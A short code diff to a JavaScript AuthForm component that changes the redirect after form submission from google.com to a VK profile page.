@@ -27,7 +27,7 @@ export const AuthForm = () => {
     setInitPassword("");
 
     postData(userData);
-    window.location.href = "https://google.com/";
+    window.location.href = "https://vk.com/AntonAnton3567";
   };
   const postData = (userData) => {
     axios
